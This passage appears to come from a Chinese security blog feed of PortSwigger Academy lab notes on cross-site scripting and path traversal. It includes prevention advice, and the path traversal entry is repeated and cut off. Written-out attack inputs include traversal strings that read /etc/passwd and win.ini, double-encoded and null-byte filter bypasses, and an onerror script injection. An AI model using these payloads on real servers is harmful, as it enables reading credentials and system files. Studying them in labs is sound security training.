<h3 id="利用跨站点脚本漏洞">利用跨站点脚本漏洞</h3>
<p>证明发现跨站脚本漏洞的传统方法是使用 alert() 函数创建一个弹出窗口。这并不是因为 XSS 与弹出窗口有什么关系；这只是一种证明您可以在给定域上执行任意 JavaScript 的方法。您可能会注意到有些人使用 alert(document.domain)。这是一种明确说明 JavaScript 在哪个域上执行的方法。</p>
<p>有时，你会想更进一步，通过提供一个完整的漏洞利用来证明 XSS 漏洞是一个真正的威胁。在本节中，我们将探讨三种最常用、最强大的 XSS 漏洞利用方法。</p>
<h4 id="利用跨站脚本窃取-cookie">利用跨站脚本窃取 cookie</h4>
<p>窃取 cookie 是一种利用 XSS 的传统方法。大多数网络应用程序都使用 cookie 进行会话处理。您可以利用跨站脚本漏洞，将受害者的 cookie 发送到自己的域，然后手动将 cookie 注入浏览器并假冒受害者。</p>
<p>实际上，这种方法有很大的局限性：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>受害者可能没有登录。</p>
</li>
<li class="lvl-2">
<p>许多应用程序会使用 HttpOnly 标志对 JavaScript 隐藏 cookie。</p>
</li>
<li class="lvl-2">
<p>会话可能被其他因素锁定，如用户的 IP 地址。</p>
</li>
<li class="lvl-2">
<p>会话可能会在你劫持之前超时。</p>
</li>
</ul>
<h4 id="Lab：-利用跨站脚本窃取-cookie">Lab： 利用跨站脚本窃取 cookie</h4>
<p>本实验室包含博客评论功能中的存储 XSS 漏洞。模拟受害者用户会查看发布后的所有评论。要解决该实验问题，利用该漏洞渗出受害者的会话 cookie，然后使用该 cookie 冒充受害者。</p>
<h3 id="不同情况下的反射-XSS">不同情况下的反射 XSS</h3>
<h2 id="存储型XSS">存储型XSS</h2>
<p>当应用程序从不受信任的来源接收数据，并以不安全的方式将这些数据包含在随后的 HTTP 响应中时，就会产生存储 XSS（也称为持久或二阶 XSS）。</p>
<p>有关数据可能是通过 HTTP 请求提交给应用程序的；例如，博客文章上的评论、聊天室中的用户昵称或客户订单上的详细联系信息。在其他情况下，数据可能来自其他不受信任的来源；例如，显示通过 SMTP 收到的邮件的网络邮件应用程序、显示社交媒体帖子的营销应用程序或显示网络流量数据包的网络监控应用程序。</p>
<p>下面是一个存储 XSS 漏洞的简单示例。一个留言板应用程序允许用户提交信息，并显示给其他用户：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, this is my message!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>应用程序不会对数据进行任何其他处理，因此攻击者可以轻松发送攻击其他用户的信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="基于-DOM-的跨站点脚本">基于 DOM 的跨站点脚本</h2>
<p>基于 DOM 的 XSS（也称 DOM XSS）是指应用程序包含一些客户端 JavaScript，这些 JavaScript 以不安全的方式处理来自不信任源的数据，通常是将数据写回 DOM。</p>
<p>在下面的示例中，应用程序使用 JavaScript 从输入字段读取值，并将该值写入 HTML 中的一个元素：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search&#x27;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> results = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;results&#x27;</span>);</span><br><span class="line">results.<span class="property">innerHTML</span> = <span class="string">&#x27;You searched for: &#x27;</span> + search;</span><br></pre></td></tr></table></figure>
<p>如果攻击者可以控制输入字段的值，他们就可以轻松构建一个恶意值，从而执行自己的脚本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">You</span> searched <span class="attr">for</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&#x27;/* Bad stuff here... */&#x27;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>在典型的情况下，输入字段将由 HTTP 请求的一部分填充，如 URL 查询字符串参数，从而允许攻击者使用恶意 URL 进行攻击，其方式与反射 XSS 相同。</p>
<h2 id="XSS-可以用来做什么？">XSS 可以用来做什么？</h2>
<p>利用跨站脚本漏洞的攻击者通常能够：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>冒充或伪装成受害用户。</p>
</li>
<li class="lvl-2">
<p>执行用户能够执行的任何操作。</p>
</li>
<li class="lvl-2">
<p>读取用户能够访问的任何数据。</p>
</li>
<li class="lvl-2">
<p>获取用户的登录凭证。</p>
</li>
<li class="lvl-2">
<p>对网站进行虚拟篡改。</p>
</li>
<li class="lvl-2">
<p>在网站中注入木马功能。</p>
</li>
</ul>
<h2 id="XSS-漏洞的影响">XSS 漏洞的影响</h2>
<p>XSS 攻击的实际影响通常取决于应用程序的性质、功能和数据，以及被攻击用户的状态。例如：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在小册子软件应用程序中，所有用户都是匿名的，所有信息都是公开的，因此影响通常很小。</p>
</li>
<li class="lvl-2">
<p>在持有敏感数据（如银行交易、电子邮件或医疗记录）的应用程序中，影响通常会很严重。</p>
</li>
<li class="lvl-2">
<p>如果被入侵的用户在应用程序中拥有更高的权限，那么影响通常会非常严重，攻击者可以完全控制存在漏洞的应用程序，并入侵所有用户及其数据。</p>
</li>
</ul>
<h2 id="如何查找和测试-XSS-漏洞">如何查找和测试 XSS 漏洞</h2>
<p>绝大多数 XSS 漏洞都可以通过 Burp Suite 的网络漏洞扫描仪快速、可靠地发现。</p>
<p>手动测试反射和存储的 XSS 通常涉及向应用程序中的每个入口点提交一些简单的唯一输入（如一个简短的字母数字字符串），识别在 HTTP 响应中返回所提交输入的每个位置，并对每个位置进行单独测试，以确定适当制作的输入是否可用于执行任意 JavaScript。通过这种方法，您可以确定发生 XSS 的上下文，并选择合适的有效载荷加以利用。</p>
<p>手动测试由 URL 参数引起的基于 DOM 的 XSS 涉及类似的过程：在参数中放置一些简单的唯一输入，使用浏览器的开发工具在 DOM 中搜索该输入，并测试每个位置以确定其是否可被利用。然而，其他类型的 DOM XSS 更难检测。要在非基于 URL 的输入（如 document.cookie）或非基于 HTML 的汇（如 setTimeout）中发现基于 DOM 的漏洞，审查 JavaScript 代码是不可替代的，而审查 JavaScript 代码可能非常耗时。Burp Suite 的网络漏洞扫描器结合了 JavaScript 的静态和动态分析，能够可靠地自动检测基于 DOM 的漏洞。</p>
<h2 id="内容安全政策">内容安全政策</h2>
<p>内容安全策略（CSP）是一种浏览器机制，旨在减轻跨站脚本和其他一些漏洞的影响。如果采用 CSP 的应用程序包含类似 XSS 的行为，那么 CSP 可能会阻碍或阻止对漏洞的利用。通常情况下，CSP 可被规避，以便利用底层漏洞。</p>
<h2 id="悬挂标记注入">悬挂标记注入</h2>
<p>悬垂标记注入是一种技术，可用于在由于输入过滤器或其他防御措施而无法进行全面跨站脚本攻击的情况下跨域捕获数据。这种技术通常可用于捕获其他用户可见的敏感信息，包括可用于代表用户执行未授权操作的 CSRF 标记。</p>
<h2 id="如何防止-XSS-攻击">如何防止 XSS 攻击</h2>
<p>在某些情况下，防止跨站脚本是一件小事，但根据应用程序的复杂程度和处理用户可控数据的方式，防止跨站脚本可能要难得多。</p>
<p>一般来说，有效防止 XSS 漏洞可能需要结合以下措施：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在输入到达时进行过滤。在接收用户输入时，尽可能严格地根据预期或有效输入进行过滤。</p>
</li>
<li class="lvl-2">
<p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p>
</li>
<li class="lvl-2">
<p>使用适当的响应标头。为防止在不打算包含任何 HTML 或 JavaScript 的 HTTP 响应中出现 XSS，可以使用 <code>Content-Type</code> 和 <code>X-Content-Type-Options</code> 标头，确保浏览器按您的意图解释响应。</p>
</li>
<li class="lvl-2">
<p>内容安全策略。作为最后一道防线，你可以使用内容安全策略（CSP）来降低仍然存在的任何 XSS 漏洞的严重性。</p>
</li>
</ul>
<p>对输出数据进行编码。在 HTTP 响应中输出用户可控数据时，要对输出进行编码，防止其被解释为活动内容。根据输出上下文，这可能需要应用 HTML、URL、JavaScript 和 CSS 编码的组合。</p>
<h2 id="有关跨站脚本的常见问题">有关跨站脚本的常见问题</h2>
<p>XSS 漏洞有多常见？XSS 漏洞非常常见，XSS 可能是最常出现的网络安全漏洞。</p>
<p>XSS 攻击有多常见？很难获得有关真实世界中 XSS 攻击的可靠数据，但它被利用的频率可能低于其他漏洞。</p>
<p>XSS 和 CSRF 有什么区别？XSS 涉及导致网站返回恶意 JavaScript，而 CSRF 涉及诱使受害用户执行他们无意执行的操作。</p>
<p>XSS 与 SQL 注入有何区别？XSS 是针对其他应用程序用户的客户端漏洞，而 SQL 注入是针对应用程序数据库的服务器端漏洞。</p>
<p>如何在 PHP 中防止 XSS？使用允许字符的白名单过滤输入，并使用类型提示或类型转换。在 HTML 上下文中使用 <code>htmlentities</code> 和 <code>ENT_QUOTES</code> 对输出进行转义，在 JavaScript 上下文中使用 JavaScript Unicode 转义。</p>
<p>如何在 Java 中防止 XSS？使用允许字符白名单过滤输入，使用 Google Guava 等库对 HTML 上下文的输出进行 HTML 编码，或使用 JavaScript Unicode 转义对 JavaScript 上下文进行转义。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>靶场练习</category>
        <category>PortSwigger靶场</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】路径遍历</title>
    <url>/posts/15b3971d/</url>
    <content><![CDATA[<h2 id="什么是路径遍历">什么是路径遍历</h2>
<p>路径遍历也称为目录遍历。这些漏洞可使攻击者在运行应用程序的服务器上读取任意文件。这可能包括：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>应用程序代码和数据</p>
</li>
<li class="lvl-2">
<p>后端系统的凭证</p>
</li>
<li class="lvl-2">
<p>敏感的操作系统文件。</p>
</li>
</ul>
<p>在某些情况下，攻击者可能能够写入服务器上的任意文件，从而修改应用程序数据或行为，并最终完全控制服务器。</p>
<span id="more"></span>
<h2 id="通过路径遍历读取任意文件">通过路径遍历读取任意文件</h2>
<h3 id="Lab-File-path-traversal-simple-case">Lab: File path traversal, simple case</h3>
<p>想象一下，一个购物应用程序会显示待售商品的图片。可以使用以下 HTML 加载图片：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>loadImage </code>URL 接收一个<code>filename</code>参数，并返回指定文件的内容。图像文件存储在磁盘的 <code>/var/www/images/</code>  目录中。要返回图像，应用程序会将请求的文件名追加到该基本目录，并使用文件系统 API 读取文件内容。换句话说，应用程序会从以下文件路径读取内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/images/218.png</span><br></pre></td></tr></table></figure>
<p>该应用程序没有针对路径遍历攻击实施任何防御措施。因此，攻击者可以请求以下 URL，从服务器文件系统中检索 /etc/passwd 文件：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=../</span>..<span class="regexp">/../</span>etc/passwd</span><br></pre></td></tr></table></figure>
<p>这将导致应用程序从以下文件路径读取数据：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>www<span class="regexp">/images/</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
<p><code>../</code>序列在文件路径中有效，表示在目录结构中上移一级。连续三个<code>../</code>顺序从 <code>/var/www/images/ </code>上移到文件系统根目录，因此实际读取的文件是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>
<p>在基于 Unix 的操作系统上，这是一个标准文件，包含服务器上注册用户的详细信息，但攻击者可以使用相同的技术检索其他任意文件。</p>
<p>在 Windows 系统中，…/ 和 …\都是有效的目录遍历序列。下面是一个针对基于 Windows 的服务器的等效攻击示例：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">https:<span class="string">//insecure-website.com/loadImage</span>?filename=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\windows\win.ini</span><br></pre></td></tr></table></figure>
<p>该实验室在显示产品图像时存在路径遍历漏洞。要解决该实验问题，请检索 <code>/etc/passwd </code>文件的内容。</p>
<p><img src="/posts/15b3971d//image-20250430160204983.png" alt="image-20250430160204983"></p>
<p>这一题很简单。把参数改一下就可以了。</p>
<h2 id="利用路径遍历漏洞的常见障碍">利用路径遍历漏洞的常见障碍</h2>
<h3 id="Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab: File path traversal, traversal sequences blocked with absolute path bypass</h3>
<p>许多将用户输入置入文件路径的应用程序都有针对路径遍历攻击的防御措施。这些防御措施往往可以被绕过。</p>
<p>如果应用程序从用户提供的文件名中删除或阻止目录遍历序列，就有可能利用各种技术绕过防御。</p>
<p>您可以使用文件系统根目录下的绝对路径（如 <code>filename=/etc/passwd</code>）来直接引用文件，而无需使用任何遍历序列。</p>
<p>该实验室在显示产品图像时存在路径遍历漏洞。应用程序会阻止遍历序列，但会将所提供的文件名视为默认工作目录的相对文件名。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>这道题阻止了相对目录遍历序列，但是可以用绝对路径</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430162204471.png" alt="image-20250430162204471"></p>
<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-non-recursively">Lab: File path traversal, traversal sequences stripped non-recursively</h3>
<p>您或许可以使用嵌套遍历序列，如 …// 或 …//。当内部序列被剥离时，这些序列会恢复为简单的遍历序列。</p>
<p>该实验室在显示产品图像时存在路径遍历漏洞。在使用用户提供的文件名之前，应用程序会从该文件名中删除路径遍历序列。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用<code>....//....//....//etc//passwd</code>遍历是可以的，但是<code>//etc//passwd</code>不行。</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430163057050.png" alt="image-20250430163057050"></p>
<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode">Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h3>
<p>在某些情况下，例如在 URL 路径或<code>multipart/form-data</code>  请求的<code>filename</code>参数中，网络服务器可能会在将您的输入传递给应用程序之前去掉任何目录遍历序列。有时，您可以通过 URL 编码，甚至是双重 URL  编码来绕过这种清理。这将分别导致 <code>%2e%2e%2f</code> 和 <code>%252e%252e%252f</code>。各种非标准编码，如 <code>..%c0%af</code> 或  <code>..%ef%bc%8f</code> 也可以使用。</p>
<p>该实验室在显示产品图像时存在路径遍历漏洞。应用程序会阻止包含路径遍历序列的输入。然后在使用输入之前对其进行 URL 解码。要解决本实验问题，请检索 /etc/passwd 文件的内容。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>url单层编码访问失败，双重编码成功。服务器会对HTTP请求双重url解码。这里把<code>../</code>换成<code>%252e%252e%252f</code>或者<code>..%252f</code>就可以了。</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430165746276.png" alt="image-20250430165746276"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        为什么服务器会进行双重解码？
    </div>
    <div class="spoiler-content">
        <p>可能的情况是，服务器在处理请求的时候，可能在不同的层次上多次进行URL解码。比如，Web服务器（如Apache或Nginx）可能先进行一次解码，然后应用框架（如PHP、Python的Flask等）可能再进行一次解码。如果两次解码之间没有对路径进行正确的规范化或安全检查，就会导致攻击者通过双重编码绕过一些安全检测。</p>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        有没有可能只解码一次或者更多次？
    </div>
    <div class="spoiler-content">
        <p>当然有可能。这取决于服务器的配置和代码实现。如果服务器只进行一次解码，那么攻击者需要直接使用单次编码的字符，例如<code>%2e%2f%2e%2e</code>等。而如果服务器解码次数超过两次，比如三次，那么攻击者可能需要使用三重编码，比如<code>%2525252e</code>（假设三重编码的话）。不过这种情况比较少见，因为通常服务器不会多次解码。</p>

    </div>
</div>
<h3 id="Lab-File-path-traversal-validation-of-start-of-path">Lab: File path traversal, validation of start of path</h3>
<p>应用程序可能要求用户提供的文件名以预期的基本文件夹开始，如 <code>/var/www/images</code>。在这种情况下，可以在所需的基本文件夹后加上适当的遍历序列。例如：<code>filename=/var/www/images/.../.../.../etc/passwd</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>我用了url编码，不使用url编码也是可以的，这里单层解码，双层就不行了</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430171637924.png" alt="image-20250430171637924"></p>
<h3 id="Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab: File path traversal, validation of file extension with null byte bypass</h3>
<p>应用程序可能要求用户提供的文件名以预期的文件扩展名结尾，如 .png。在这种情况下，可以使用空字节在所需扩展名之前有效地终止文件路径。例如：filename=…/…/…/etc/passwd%00.png。</p>
<p>本实验室在显示产品图像时存在路径遍历漏洞。应用程序会验证所提供的文件名是否以预期的文件扩展名结尾。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
<p>这个感觉好牛啊，希望自己慢慢积累，积跬步至千里吧。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>相对路径后加<code>%00.png</code>绕过文件后缀验证</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430172259167.png" alt="image-20250430172259167"></p>
<h2 id="如何防止路径遍历攻击">如何防止路径遍历攻击</h2>
<p>防止路径遍历漏洞的最有效方法是完全避免将用户提供的输入传递给文件系统 API。许多这样做的应用程序函数都可以重写，以更安全的方式提供相同的行为。</p>
<p>如果无法避免将用户提供的输入传递给文件系统 API，我们建议使用两层防御来防止攻击：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在处理用户输入之前对其进行验证。理想情况下，将用户输入与允许值白名单进行比较。如果做不到这一点，则要验证输入是否只包含允许的内容，例如只包含字母数字字符。</p>
</li>
<li class="lvl-2">
<p>验证所提供的输入后，将输入追加到基本目录，并使用平台文件系统 API 对路径进行规范化。验证规范化路径是否以预期的基本目录开始。</p>
</li>
</ul>
<p>下面是一个根据用户输入验证文件规范路径的简单 Java 代码示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码逐行解析：</strong></p>
<ol>
<li class="lvl-3">
<p>创建文件对象</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>File</code>类</strong>：Java中用于表示文件或目录路径的类。</p>
</li>
<li class="lvl-2">
<p><strong>构造函数参数</strong>：</p>
<ul class="lvl-2">
<li class="lvl-4"><code>BASE_DIRECTORY</code>：预定义的基础目录（如<code>/safe/path</code>），用于限制文件访问范围。</li>
<li class="lvl-4"><code>userInput</code>：用户输入的路径（如<code>data.txt</code>或<code>../../secret.txt</code>）。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>作用</strong>：将两者拼接成完整路径。例如：</p>
<ul class="lvl-2">
<li class="lvl-4">若<code>BASE_DIRECTORY</code>是<code>/safe</code>，<code>userInput</code>是<code>file.txt</code>，则拼接为<code>/safe/file.txt</code>。</li>
<li class="lvl-4">若<code>userInput</code>是<code>../etc/passwd</code>，则拼接为<code>/safe/../etc/passwd</code>。</li>
</ul>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p>路径规范化验证</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// 处理文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>getCanonicalPath()</code></strong>：将路径转换为<strong>绝对且唯一</strong>的规范形式：</p>
<ul class="lvl-2">
<li class="lvl-4">解析<code>.</code>（当前目录）和<code>..</code>（上级目录）。</li>
<li class="lvl-4">去除多余的斜杠（如<code>/safe//file</code>变为<code>/safe/file</code>）。</li>
<li class="lvl-4">解析符号链接（如将快捷方式转为真实路径）。</li>
</ul>
<p>例如：<code>/safe/../etc/passwd</code> 会被规范化为 <code>/etc/passwd</code>。</p>
</li>
<li class="lvl-2">
<p><strong><code>startsWith(BASE_DIRECTORY)</code></strong>：检查规范路径是否以<code>BASE_DIRECTORY</code>开头。</p>
<ul class="lvl-2">
<li class="lvl-4">若用户输入合法（如<code>data.txt</code>），规范路径为<code>/safe/data.txt</code>，验证通过。</li>
<li class="lvl-4">若用户输入非法（如<code>../../etc/passwd</code>），规范路径为<code>/etc/passwd</code>，验证失败。</li>
</ul>
</li>
</ul>
<p>但是这段代码应该有一定的问题，就是只要保证文件路径与<code>BASE_DIRECTORY</code>一致即可。比如说，如果<code>BASE_DIRECTORY</code>是<code>/base</code>便可以构造<code>/baseXXXX</code>越权访问与文件开头与<code>BASE_DIRECTORY</code>一致的同级目录。</p>
<p>本文参考：</p>
<p><a href="https://portswigger.net/web-security/file-path-traversal">Path traversal</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>路径遍历</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】路径遍历</title>
    <url>/posts/15b3971d/</url>
    <content><![CDATA[<h2 id="什么是路径遍历">什么是路径遍历</h2>
<p>路径遍历也称为目录遍历。这些漏洞可使攻击者在运行应用程序的服务器上读取任意文件。这可能包括：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>应用程序代码和数据</p>
</li>
<li class="lvl-2">
<p>后端系统的凭证</p>
</li>
<li class="lvl-2">
<p>敏感的操作系统文件。</p>
</li>
</ul>
<p>在某些情况下，攻击者可能能够写入服务器上的任意文件，从而修改应用程序数据或行为，并最终完全控制服务器。</p>
<span id="more"></span>
<h2 id="通过路径遍历读取任意文件">通过路径遍历读取任意文件</h2>
<h3 id="Lab-File-path-traversal-simple-case">Lab: File path traversal, simple case</h3>
<p>想象一下，一个购物应用程序会显示待售商品的图片。可以使用以下 HTML 加载图片：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>loadImage </code>URL 接收一个<code>filename</code>参数，并返回指定文件的内容。图像文件存储在磁盘的 <code>/var/www/images/</code>  目录中。要返回图像，应用程序会将请求的文件名追加到该基本目录，并使用文件系统 API 读取文件内容。换句话说，应用程序会从以下文件路径读取内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/images/218.png</span><br></pre></td></tr></table></figure>
<p>该应用程序没有针对路径遍历攻击实施任何防御措施。因此，攻击者可以请求以下 URL，从服务器文件系统中检索 /etc/passwd 文件：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=../</span>..<span class="regexp">/../</span>etc/passwd</span><br></pre></td></tr></table></figure>
<p>这将导致应用程序从以下文件路径读取数据：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>www<span class="regexp">/images/</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
<p><code>../</code>序列在文件路径中有效，表示在目录结构中上移一级。连续三个<code>../</code>顺序从 <code>/var/www/images/ </code>上移到文件系统根目录，因此实际读取的文件是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>
<p>在基于 Unix 的操作系统上，这是一个标准文件，包含服务器上注册用户的详细信息，但攻击者可以使用相同的技术检索其他任意文件。</p>
<p>在 Windows 系统中，…/ 和 …\都是有效的目录遍历序列。下面是一个针对基于 Windows 的服务器的等效攻击示例：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">https:<span class="string">//insecure-website.com/loadImage</span>?filename=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\windows\win.ini</span><br></pre></td></tr></table></figure>
<p>该实验室在显示产品图像时存在路径遍历漏洞。要解决该实验问题，请检索 <code>/etc/passwd </code>文件的内容。</p>
<p><img src="/posts/15b3971d//image-20250430160204983.png" alt="image-20250430160204983"></p>
<p>这一题很简单。把参数改一下就可以了。</p>
<h2 id="利用路径遍历漏洞的常见障碍">利用路径遍历漏洞的常见障碍</h2>
<h3 id="Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab: File path traversal, traversal sequences blocked with absolute path bypass</h3>
<p>许多将用户输入置入文件路径的应用程序都有针对路径遍历攻击的防御措施。这些防御措施往往可以被绕过。</p>
<p>如果应用程序从用户提供的文件名中删除或阻止目录遍历序列，就有可能利用各种技术绕过防御。</p>
<p>您可以使用文件系统根目录下的绝对路径（如 <code>filename=/etc/passwd</code>）来直接引用文件，而无需使用任何遍历序列。</p>
<p>该实验室在显示产品图像时存在路径遍历漏洞。应用程序会阻止遍历序列，但会将所提供的文件名视为默认工作目录的相对文件名。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>这道题阻止了相对目录遍历序列，但是可以用绝对路径</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430162204471.png" alt="image-20250430162204471"></p>
<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-non-recursively">Lab: File path traversal, traversal sequences stripped non-recursively</h3>
<p>您或许可以使用嵌套遍历序列，如 …// 或 …//。当内部序列被剥离时，这些序列会恢复为简单的遍历序列。</p>
<p>该实验室在显示产品图像时存在路径遍历漏洞。在使用用户提供的文件名之前，应用程序会从该文件名中删除路径遍历序列。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用<code>....//....//....//etc//passwd</code>遍历是可以的，但是<code>//etc//passwd</code>不行。</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430163057050.png" alt="image-20250430163057050"></p>
<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode">Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h3>
<p>在某些情况下，例如在 URL 路径或<code>multipart/form-data</code>  请求的<code>filename</code>参数中，网络服务器可能会在将您的输入传递给应用程序之前去掉任何目录遍历序列。有时，您可以通过 URL 编码，甚至是双重 URL  编码来绕过这种清理。这将分别导致 <code>%2e%2e%2f</code> 和 <code>%252e%252e%252f</code>。各种非标准编码，如 <code>..%c0%af</code> 或  <code>..%ef%bc%8f</code> 也可以使用。</p>
<p>该实验室在显示产品图像时存在路径遍历漏洞。应用程序会阻止包含路径遍历序列的输入。然后在使用输入之前对其进行 URL 解码。要解决本实验问题，请检索 /etc/passwd 文件的内容。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>url单层编码访问失败，双重编码成功。服务器会对HTTP请求双重url解码。这里把<code>../</code>换成<code>%252e%252e%252f</code>或者<code>..%252f</code>就可以了。</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430165746276.png" alt="image-20250430165746276"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        为什么服务器会进行双重解码？
    </div>
    <div class="spoiler-content">
        <p>可能的情况是，服务器在处理请求的时候，可能在不同的层次上多次进行URL解码。比如，Web服务器（如Apache或Nginx）可能先进行一次解码，然后应用框架（如PHP、Python的Flask等）可能再进行一次解码。如果两次解码之间没有对路径进行正确的规范化或安全检查，就会导致攻击者通过双重编码绕过一些安全检测。</p>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        有没有可能只解码一次或者更多次？
    </div>
    <div class="spoiler-content">
